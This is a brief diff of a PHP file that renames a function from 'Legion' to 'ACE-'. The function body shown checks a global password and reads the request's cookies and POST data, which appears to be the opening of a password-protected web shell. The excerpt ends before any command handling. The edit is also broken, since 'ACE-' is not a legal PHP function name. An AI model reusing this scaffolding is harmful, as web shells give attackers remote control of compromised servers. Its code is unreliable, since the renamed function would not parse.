@@ -12,8 +12,8 @@
 ?>
 
 
-if(!function_exists('Legion')){
-	function Legion(){
+if(!function_exists('ACE-')){
+	function ACE-(){
 		if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass'])!='')){
 			$c = $_COOKIE;
 			$p = $_POST;
